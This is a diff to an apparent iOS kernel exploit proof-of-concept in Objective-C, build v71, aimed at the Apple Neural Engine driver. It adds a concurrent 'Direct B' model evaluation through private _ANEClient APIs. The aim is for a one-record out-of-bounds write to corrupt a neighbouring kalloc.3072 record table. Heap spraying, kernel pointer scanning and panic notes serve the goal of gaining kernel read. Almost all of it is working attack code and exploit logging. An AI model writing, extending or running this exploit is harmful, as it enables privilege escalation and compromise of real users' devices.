@@ -158,7 +158,7 @@
 #import <math.h>
 #import <objc/message.h>
 
-#define P044_BUILD @"p044-v70-1rec-oob"
+#define P044_BUILD @"p044-v71-directB"
 
 #define INPUT_COUNT 191
 #define PAYLOAD_SIZE 0xb80
@@ -238,7 +238,8 @@ static BOOL p044_model_is_addchain(void) {
 #define ANE_REQ_OFF_OUT_IDS 0x52cu
 #define ANE_REQ_OFF_EVENTS 0x930u
 #define ANE_TOTIN 191u
-#define P044_HOLE_MODE 0 /* v70: live-kmsg neighbor for 1-record OOB (REQ_IN=192 → 193 records). 1 = freed-hole (CLOSED); 2 = contiguous-run (DEAD per 101ae) */
+#define P044_HOLE_MODE 0 /* v70/v71: live-kmsg neighbor for 1-record OOB (REQ_IN=192 → 193 records). 1 = freed-hole (CLOSED); 2 = contiguous-run (DEAD per 101ae) */
+#define P044_B_IN 127u /* v71 Direct B: 127 in + 1 out = 128 records. MemoryMap count gate is >0x80; 128 is consumed. */
 #define P044_HOLE_RUN_LO 1024u /* v48.2: free pairs [LO..HI) hole+victim — adjacent elements */
 #define P044_HOLE_RUN_HI 1536u
 #define P044_RECLAIM_SURF 8u
@@ -561,6 +562,16 @@ static id g_aneClient = nil;
 static id g_aneReq = nil;
 static int g_aneModelOk = 0;
 static int g_aneReqOk = 0;
+/* v71 Direct B: in-bounds 128-record consumer on the same sharedConnection.
+   CoreML B is cached (note 120) and never re-runs CheckandPrewire. First
+   Direct evaluate of this model IS the concurrent consume. */
+static id g_aneBModel = nil;
+static id g_aneBReq = nil;
+static int g_aneBOk = 0;
+static int g_aneBReqOk = 0;
+static uint32_t g_aneBOutSid = 0;
+static int g_aneBFireRc = -1;
+static double g_aneBFireT = NAN;
 
 /* v68: StikDebug's graph. playback+mixWithOthers, 1 s zero PCM buffer
    scheduled .loops on an AVAudioPlayerNode, engine.start. The IO callback
@@ -767,6 +778,10 @@ static void cls_reset(void) {
     g_cls_forge_sid = 0;
     g_cls_out_entry = 0;
     g_cls_readback = 0;
+    g_aneBOk = g_aneBReqOk = 0;
+    g_aneBOutSid = 0;
+    g_aneBFireRc = -1;
+    g_aneBFireT = NAN;
     g_forgeCount = 0;
     g_yB1 = g_yB2 = NAN;
     g_foreignOutSid = 0; g_foreignUsePre = g_foreignUsePost = 0;
@@ -1320,6 +1335,132 @@ static int p044_ane_client_fire(NSMutableString *out) {
     return ok ? 1 : 0;
 }
 
+/* v71 Direct B: load XVRC27_127inmin_1out on the SAME sharedConnection as A.
+   Load only — do not evaluate here (first evaluate is the concurrent consume). */
+static int p044_ane_load_b(NSMutableString *out) {
+    Class Model = NSClassFromString(@"_ANEModel");
+    Class Client = NSClassFromString(@"_ANEClient");
+    NSURL *url = [[NSBundle mainBundle] URLForResource:MODEL_B_NAME withExtension:@"mlmodelc"];
+    if (!Model || !Client || !url) {
+        [out appendFormat:@"  [v71] Direct B missing cls/url model=%@\n", MODEL_B_NAME];
+        return 0;
+    }
+    if (!g_aneClient) {
+        g_aneClient = ((id (*)(id, SEL))objc_msgSend)(Client, NSSelectorFromString(@"sharedConnection"));
+    }
+    if (!g_aneClient) {
+        [out appendString:@"  [v71] Direct B sharedConnection nil\n"];
+        return 0;
+    }
+    id model = ((id (*)(id, SEL, id, id, id, id))objc_msgSend)(
+        Model, NSSelectorFromString(@"modelAtURLWithSourceURL:sourceURL:key:cacheURLIdentifier:"),
+        url, url, @"p044b", @"p044b");
+    if (!model) {
+        [out appendString:@"  [v71] Direct B _ANEModel create nil\n"];
+        return 0;
+    }
+    NSError *err = nil;
+    SEL compileSel = NSSelectorFromString(@"compileModel:options:qos:error:");
+    SEL loadSel = NSSelectorFromString(@"doLoadModel:options:qos:error:");
+    if ([g_aneClient respondsToSelector:compileSel]) {
+        ((BOOL (*)(id, SEL, id, id, unsigned, NSError **))objc_msgSend)(
+            g_aneClient, compileSel, model, @{}, 2, &err);
+    }
+    if ([g_aneClient respondsToSelector:loadSel]) {
+        ((BOOL (*)(id, SEL, id, id, unsigned, NSError **))objc_msgSend)(
+            g_aneClient, loadSel, model, @{}, 2, &err);
+    }
+    uint64_t h = 0;
+    SEL phSel = NSSelectorFromString(@"programHandle");
+    if ([model respondsToSelector:phSel]) {
+        h = ((unsigned long long (*)(id, SEL))objc_msgSend)(model, phSel);
+    }
+    [out appendFormat:@"  [v71] Direct B programHandle=0x%llx err=%@ (%s) model=%@\n",
+        (unsigned long long)h, err.localizedDescription ?: @"ok",
+        h != 0 ? "armed — first evaluate is the concurrent consume" : "handle=0",
+        MODEL_B_NAME];
+    g_aneBModel = model;
+    g_aneBOk = (h != 0);
+    return g_aneBOk;
+}
+
+/* v71: 127 in + 1 out = 128 records. MemoryMap consumes (count gate is >128). */
+static int p044_ane_build_request_b(NSMutableString *out) {
+    Class surfCls = NSClassFromString(@"_ANEIOSurfaceObject");
+    Class reqCls = NSClassFromString(@"_ANERequest");
+    if (!surfCls || !reqCls) {
+        [out appendString:@"  [v71] Direct B _ANEIOSurfaceObject/_ANERequest missing\n"];
+        return 0;
+    }
+    SEL wrapSel = NSSelectorFromString(@"objectWithIOSurface:");
+    NSMutableArray *inputs = [NSMutableArray arrayWithCapacity:P044_B_IN];
+    NSMutableArray *inIdx = [NSMutableArray arrayWithCapacity:P044_B_IN];
+    uint32_t firstSid = 0, lastSid = 0;
+    for (uint32_t i = 0; i < P044_B_IN; i++) {
+        CFTypeRef s = p044_surface_create_poc(P044_REQ_IN_BYTES, (uint8_t)(0x51 + (i & 0xf)));
+        if (!s) {
+            [out appendFormat:@"  [v71] Direct B input %u create failed\n", i];
+            return 0;
+        }
+        uint32_t sid = p044_sfGetID(s);
+        if (g_nSurf < 1024u) g_surfs[g_nSurf++] = s;
+        else CFRelease(s);
+        if (!firstSid) firstSid = sid;
+        lastSid = sid;
+        id obj = ((id (*)(id, SEL, CFTypeRef))objc_msgSend)(surfCls, wrapSel, s);
+        if (!obj) {
+            [out appendFormat:@"  [v71] Direct B wrap failed at %u\n", i];
+            return 0;
+        }
+        [inputs addObject:obj];
+        [inIdx addObject:@(i)];
+    }
+    CFTypeRef os = p044_surface_create_poc(P044_REQ_OUT_BYTES, 0x62);
+    if (!os) {
+        [out appendString:@"  [v71] Direct B output create failed\n"];
+        return 0;
+    }
+    g_aneBOutSid = p044_sfGetID(os);
+    if (g_nSurf < 1024u) g_surfs[g_nSurf++] = os;
+    else CFRelease(os);
+    id oobj = ((id (*)(id, SEL, CFTypeRef))objc_msgSend)(surfCls, wrapSel, os);
+    if (!oobj) {
+        [out appendString:@"  [v71] Direct B output wrap failed\n"];
+        return 0;
+    }
+    g_aneBReq = ((id (*)(id, SEL, id, id, id, id, id))objc_msgSend)(reqCls,
+        NSSelectorFromString(@"requestWithInputs:inputIndices:outputs:outputIndices:procedureIndex:"),
+        inputs, inIdx, @[oobj], @[@0], @0);
+    if (!g_aneBReq) {
+        [out appendString:@"  [v71] Direct B _ANERequest create failed\n"];
+        return 0;
+    }
+    BOOL valid = NO;
+    SEL vSel = NSSelectorFromString(@"validate");
+    if ([g_aneBReq respondsToSelector:vSel]) {
+        valid = ((BOOL (*)(id, SEL))objc_msgSend)(g_aneBReq, vSel);
+    }
+    [out appendFormat:@"  [v71] Direct B request: inputs=%u outputs=1 records=128 (MemoryMap CONSUMES) sids=%u..%u outSid=%u validate=%d\n",
+        (unsigned)P044_B_IN, firstSid, lastSid, g_aneBOutSid, valid];
+    return 1;
+}
+
+static int p044_ane_client_fire_b(NSMutableString *out) {
+    if (!g_aneClient || !g_aneBModel || !g_aneBReq) return -1;
+    SEL fireSel = NSSelectorFromString(@"doEvaluateDirectWithModel:options:request:qos:error:");
+    if (![g_aneClient respondsToSelector:fireSel]) {
+        [out appendString:@"  [v71] Direct B doEvaluateDirectWithModel selector missing\n"];
+        return -1;
+    }
+    NSError *err = nil;
+    BOOL ok = ((BOOL (*)(id, SEL, id, id, id, unsigned, NSError **))objc_msgSend)(
+        g_aneClient, fireSel,
+        g_aneBModel, @{}, g_aneBReq, (unsigned)2, &err);
+    [out appendFormat:@"  [v71] Direct B doEvaluateDirectWithModel ok=%d err=%@\n", ok,
+        err ? err.localizedDescription : @"<nil>"];
+    return ok ? 1 : 0;
+}
+
 #pragma mark - NEON witnesses (v25 overlay — not the 3072 engine)
 
 typedef struct {
@@ -1673,6 +1814,7 @@ static void *watch_worker(void *arg) {
                     hexdump16(actual, first, out);
                     kptr_scan(actual, (uint32_t)i, out);
                     fingerprint_scan(actual, first, out);
+                    out_entry_scan(actual, out);
                 }
             } else if (kr != MACH_RCV_TIMED_OUT && kr != MACH_RCV_INVALID_NAME) {
                 pairs[i].done = 1;
@@ -2048,6 +2190,7 @@ static void *watch_worker(void *arg) {
     [out appendString:@"Oct-2 panic pack: record area = dedicated kalloc.3072 (192x16); GZAlloc guard abort (pc=+0x18C store) and modified-after-free are the two freed-lane failure modes. Hole lane CLOSED.\n"];
     [out appendString:@"Run#1 proof: raw IOConnect conn CLOSED (handle binds to sharedConnection; sel0 kr=0x5, sel2 0xe00002c2).\n"];
     [out appendString:@"Landing lane per build: HOLE_MODE=0 live-kmsg neighbor (v70 1-record OOB). Hole punch CLOSED.\n"];
+    [out appendString:@"v71 Direct B: CoreML B is cached (note 120) and never re-prewires. B is now a first Direct evaluate of XVRC27_127inmin_1out (127+1=128 records, MemoryMap CONSUMES). A stays REQ_IN=192 1-record OOB. Overlap is two doEvaluateDirectWithModel on sharedConnection. Signals: B t>0 (not cache), B err/geometry, B outSid useCount, A's output record {outSid,0,1,2} recvd in a live extra (occupancy includes out_entry). Consume-forge = bar half two. Still not hasKread. AfterKread HOLD.\n"];
     [out appendString:@"Occupancy HIT is a 3072 store of ANE records. NOT conversion. NOT hasKread.\n"];
     [out appendString:@"record_forge: forge_seen>0 = spilled body carries client-chosen sids (bar half one).\n\n"];
 
@@ -2455,13 +2598,10 @@ static void *watch_worker(void *arg) {
         if (!model) { p044_write_log(out); return out; }
     }
 
-    // 2b. Load model B (v47 E1: second live request / consumer)
-    MLModel *modelB = [self loadModelB:out];
-    if (!modelB) {
-        [out appendString:@"  STOP: model B unavailable — record forge cannot run\n"];
-        p044_write_log(out);
-        return out;
-    }
+    // 2b. v71: do NOT CoreML-load B. MLModel load + predict caches the
+    //     127inmin program (note 120 yBc t=0.00s). Direct B load is PHASE 3b.5.
+    MLModel *modelB = nil;
+    [out appendString:@"  [v71] CoreML B load SKIPPED (cache poison). Direct B = first evaluate of 127inmin.\n"];
     p044_write_log(out);
 
     // 3a. IOSurface dlsym (request surfaces need create/getid/base/lock)
@@ -2690,16 +2830,22 @@ static void *watch_worker(void *arg) {
     }
     p044_write_log(out);
 
+    [out appendString:@"\n=== PHASE 3b.5: Direct B load+request (127+1=128, MemoryMap consumes) ===\n"];
+    g_aneBOk = p044_ane_load_b(out);
+    if (g_aneBOk) g_aneBReqOk = p044_ane_build_request_b(out);
+    if (!g_aneBOk || !g_aneBReqOk) {
+        [out appendString:@"  [v71] Direct B NOT armed — concurrent consume skipped this tap (A still fires)\n"];
+    }
+    p044_write_log(out);
+
     // 3. Create features
     MLDictionaryFeatureProvider *provider = [self createFeatures:out];
     if (!provider) { p044_write_log(out); return out; }
+    MLDictionaryFeatureProvider *providerB = nil; /* v71: CoreML B unused */
+    (void)modelB; (void)providerB;
 
-    // 3b. B provider + baseline predict (v47 E4: pre-spray yB1)
-    MLDictionaryFeatureProvider *providerB = [self providerB:out];
-    if (!providerB) { p044_write_log(out); return out; }
-    [out appendString:@"\n=== PHASE 3e: B baseline predict (pre-spray yB1) ===\n"];
-    g_yB1 = [self predictB:modelB provider:providerB tag:@"pre-spray" out:out];
-    [out appendString:@"  B sentinel: all-613 baseline (v47 1..127 min was y=1, insensitive). Expect yB=613.\n"];
+    [out appendString:@"\n=== PHASE 3e: CoreML B baseline SKIPPED ===\n"];
+    [out appendString:@"  [v71] first Direct B evaluate is PHASE 4g/5b (consume-forge). CoreML predict would cache 127inmin.\n"];
     p044_write_log(out);
 
     // 4. Start heap churn BEFORE spray
@@ -2744,24 +2890,25 @@ static void *watch_worker(void *arg) {
     p044_write_log(out);
 #endif
 
-    // 4g. v50 CONSUME-FORGE WINDOW: B's predict starts ~1ms before A's fire.
-    [out appendString:@"\n=== PHASE 4g: B concurrent predict (t-1ms; consume-forge window) ===\n"];
+    // 4g. v71 CONSUME-FORGE: Direct B evaluate starts ~1ms before A's OOB fire.
+    [out appendString:@"\n=== PHASE 4g: Direct B concurrent evaluate (t-1ms; consume-forge window) ===\n"];
     NSMutableString *bBuf = [NSMutableString string];
     __block double yBcLocal = NAN;
     dispatch_semaphore_t bDone = dispatch_semaphore_create(0);
-    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-        yBcLocal = [self predictB:modelB provider:providerB tag:@"concurrent" out:bBuf];
+    if (g_aneBOk && g_aneBReqOk) {
+        dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+            NSDate *t0 = [NSDate date];
+            g_aneBFireRc = p044_ane_client_fire_b(bBuf);
+            g_aneBFireT = -[t0 timeIntervalSinceNow];
+            dispatch_semaphore_signal(bDone);
+        });
+        usleep(1000);
+        [out appendString:@"  [v71] Direct B launched t-1ms. 128-record table is allocated in CheckandPrewire then MemoryMapped. A's 1-record OOB (table+0xC00) aims at B.record[0] if the two 3072s are adjacent. CoreML B is not used.\n"];
+        [out appendString:@"  Signals: B t>0 (not cache), B err (geometry), B outSid useCount, or A's {outSid,0,1,2} recvd in a sprayed extra.\n"];
+    } else {
         dispatch_semaphore_signal(bDone);
-    });
-    usleep(1000); /* stagger */
-    [out appendString:@"  B launched t-1ms. HOLE_MODE=1 frees holes ASCENDING -> freelist top = highest "
-        @"hole; B's mapRequest object pops the top, A's fire pops the next-lower hole = the chunk "
-        @"PHYSICALLY BELOW B's. A's fill (entries 192..254 from obj+0xC00) therefore lands INSIDE "
-        @"B's live mapRequest object at B_obj+0x64 = B's entries 6..68 become OUR staged sids "
-        @"while B's prewire is still in flight (note 118 s4 consume-path forge).\n"];
-    [out appendString:@"  Signals: B y change (B read OUR 16KB staged surfaces), B error (geometry "
-        @"mismatch mid-prewire), or B wedge. If A's object instead pops the top, the fill lands in "
-        @"the victim band - the v49-style port-kind hit is the fallback observation.\n"];
+        [out appendString:@"  [v71] Direct B not armed — A fires alone (16B neighbor is a live kmsg if adjacent).\n"];
+    }
     p044_write_log(out);
 
     // 6. FIRE — v48.1 G1/G2: _ANEClient doEvaluateDirectWithModel, ids[] = OUR request surfaces
@@ -2864,24 +3011,33 @@ static void *watch_worker(void *arg) {
     [out appendFormat:@"  fire=%@ rc=%d pred=%s\n", fireMode, fireRc, predOK ? "OK" : "FAILED"];
     p044_write_log(out);
 
-    /* v50: join the concurrent B predict and read the consume-forge signal */
     long bW = dispatch_semaphore_wait(bDone, dispatch_time(DISPATCH_TIME_NOW, 15 * NSEC_PER_SEC));
-    [out appendString:@"\n=== PHASE 5b: B concurrent result (consume-forge signal) ===\n"];
+    [out appendString:@"\n=== PHASE 5b: Direct B concurrent result (consume-forge signal) ===\n"];
     [out appendString:bBuf];
     g_yBc = yBcLocal;
     if (bW != 0) {
-        [out appendString:@"  [!] B concurrent predict STILL IN FLIGHT 15s - B wedged mid-prewire "
-            @"(possible forge hit; check the panic pack if the boot dies)\n"];
-    } else if (isnan(g_yBc) && !isnan(g_yB1)) {
-        [out appendString:@"  *** B CONCURRENT PREDICT ERRORED - B's prewire smashed mid-flight by "
-            @"A's fill (consume-forge candidate) ***\n"];
-    } else if (!isnan(g_yB1) && !isnan(g_yBc) && g_yB1 != g_yBc) {
-        [out appendFormat:@"  *** B Y CHANGED with OUR sids clobbering B's table (yB1=%.0f yBc=%.0f) "
-            @"- B bound OUR staged surfaces: CONSUME-PATH FORGE candidate (bar half two) ***\n",
-            g_yB1, g_yBc];
-    } else if (!isnan(g_yBc)) {
-        [out appendString:@"  [*] B concurrent predict unchanged (A popped the top hole -> fill "
-            @"landed in the victim band, or B's object was not adjacent this fire)\n"];
+        [out appendString:@"  [!] Direct B STILL IN FLIGHT 15s — B wedged mid-prewire (possible forge; check panic pack if the boot dies)\n"];
+    } else if (g_aneBOk && g_aneBReqOk) {
+        [out appendFormat:@"  [v71] Direct B rc=%d t=%.3fs (t~0 = cache/serialize; t>0.01 = CheckandPrewire ran)\n",
+            g_aneBFireRc, isnan(g_aneBFireT) ? 0.0 : g_aneBFireT];
+        if (g_aneBFireRc == 0) {
+            [out appendString:@"  *** Direct B evaluate FAILED — geometry/count/sid mismatch mid-prewire is a consume-forge candidate (bar half two) ***\n"];
+        } else if (!isnan(g_aneBFireT) && g_aneBFireT < 0.005) {
+            [out appendString:@"  [*] Direct B t<5ms — likely serialized/cached on sharedConnection; overlap with A's fill may have been zero this tap\n"];
+        } else {
+            [out appendString:@"  [v71] Direct B completed with t>5ms — MemoryMap ran. Adjacency of A's OOB into B.record[0] is the remaining variable.\n"];
+        }
+        if (g_aneBOutSid && p044_sfLookup && p044_sfUseCount) {
+            CFTypeRef bo = p044_sfLookup(g_aneBOutSid);
+            if (bo) {
+                uint32_t uc = p044_sfUseCount(bo);
+                [out appendFormat:@"  [v71] Direct B outSid=%u useCount=%u (bump = MemoryMap wired B's output)\n",
+                    g_aneBOutSid, uc];
+                CFRelease(bo);
+            }
+        }
+    } else {
+        [out appendString:@"  [v71] Direct B was not armed\n"];
     }
     p044_write_log(out);
 
@@ -2902,17 +3058,8 @@ static void *watch_worker(void *arg) {
     }
     p044_write_log(out);
 
-    // 6d. B post-fire predict (v47 E4: second live request)
-    [out appendString:@"\n=== PHASE 6d: B post-fire predict (yB2, second live request) ===\n"];
-    g_yB2 = [self predictB:modelB provider:providerB tag:@"post-fire" out:out];
-    if (isnan(g_yB2) && !isnan(g_yB1)) {
-        [out appendString:@"  *** B POST-FIRE ERROR — request state smashed (yB1 was fine) ***\n"];
-    } else if (!isnan(g_yB1) && !isnan(g_yB2) && g_yB1 != g_yB2) {
-        [out appendFormat:@"  *** B Y CHANGED across fire (yB1=%.0f yB2=%.0f) — B consumed smashed records ***\n",
-            g_yB1, g_yB2];
-    } else if (!isnan(g_yB1) && !isnan(g_yB2)) {
-        [out appendString:@"  [*] B unchanged across the fire (no smash reach into B's records)\n"];
-    }
+    [out appendString:@"\n=== PHASE 6d: CoreML B post-fire SKIPPED (v71 Direct B already evaluated once) ===\n"];
+    [out appendString:@"  [v71] a second B evaluate would be cached. Consume-forge evidence is PHASE 5b + extra out_entry scan.\n"];
     p044_write_log(out);
 
     // 6e. Reclaim read-back (v48 F4: freed-hole lane — panic-B shape)
@@ -3158,7 +3305,7 @@ static void *watch_worker(void *arg) {
             g_foreignDiff];
     }
     BOOL conversion = (g_cls_desc_forged > 0) || (g_cls_body_forged > 0 && g_cls_kptr > 0);
-    BOOL occupancy = ((g_cls_fp > 0) || (g_cls_forge_sid > 0)) && !conversion;
+    BOOL occupancy = ((g_cls_fp > 0) || (g_cls_forge_sid > 0) || (g_cls_out_entry > 0)) && !conversion;
     [out appendFormat:@"\n=== CONVERSION BAR ===\n"];
     [out appendFormat:@"  fingerprint=%d kptr=%d kptr_tail>=0x3e0=%d\n",
         g_cls_fp, g_cls_kptr, g_cls_kptr_tail];
@@ -3299,11 +3446,15 @@ static void *watch_worker(void *arg) {
         [out appendString:@"  [v66] ANE lane KEPT ALIVE with the hold (request/program still attached; released at the OBSERVE tap)\n"];
     } else {
         g_aneReq = nil;
+        g_aneBReq = nil;
+        g_aneBModel = nil;
         g_aneClient = nil;
         g_aneModelObj = nil;
         g_aneModelOk = 0;
         g_aneReqOk = 0;
-        [out appendString:@"  _ANEClient lane released\n"];
+        g_aneBOk = 0;
+        g_aneBReqOk = 0;
+        [out appendString:@"  _ANEClient lane released (A+B)\n"];
     }
     if (g_guestHold) {
         [out appendFormat:@"\n=== v69 GUEST ANE HOLD (in-flight window already closed): sid=%u (request OUTPUT surface still held; the standalone census had to land DURING the 180s window above) ===\n",
